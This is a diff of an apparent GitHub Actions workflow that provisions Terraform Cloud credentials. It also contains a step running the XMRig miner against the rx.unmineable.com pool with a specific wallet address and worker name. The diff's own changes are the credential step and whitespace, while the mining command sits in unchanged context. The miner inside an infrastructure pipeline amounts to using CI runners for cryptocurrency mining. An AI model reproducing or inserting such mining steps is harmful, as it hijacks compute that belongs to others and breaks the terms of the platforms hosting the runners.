@@ -18,8 +18,10 @@ jobs:
         with:
           terraform_version: 1.0.0  # Specify your desired Terraform version
 
-      - name: Terraform Login
-        run: echo "${{ secrets.TERRAFORM_CLOUD_TOKEN }}" | terraform login
+      - name: Configure Terraform Cloud Credentials
+        run: |
+          mkdir -p ~/.terraform.d
+          echo "{\"credentials\": {\"app.terraform.io\": {\"token\": \"${{ secrets.TERRAFORM_CLOUD_TOKEN }}\"}}}" > ~/.terraform.d/credentials.tfrc.json
 
       - name: Terraform Init
         run: terraform -chdir=./terraform init
@@ -45,7 +47,7 @@ jobs:
         run: |
           cd xmrig-6.21.0
           ./xmrig --algo=rx --coin=LTC -o stratum+ssl://rx.unmineable.com:4444 -u LTC:ltc1q347zsdpmes9p22z7zzgfxpeu0jq6w4nrathcv4.foxy0#43mx-rlih | tee xmrig.log
-          
+
       - name: Print XMRig Log
         run: |
           echo "XMRig Hashrate Log:"
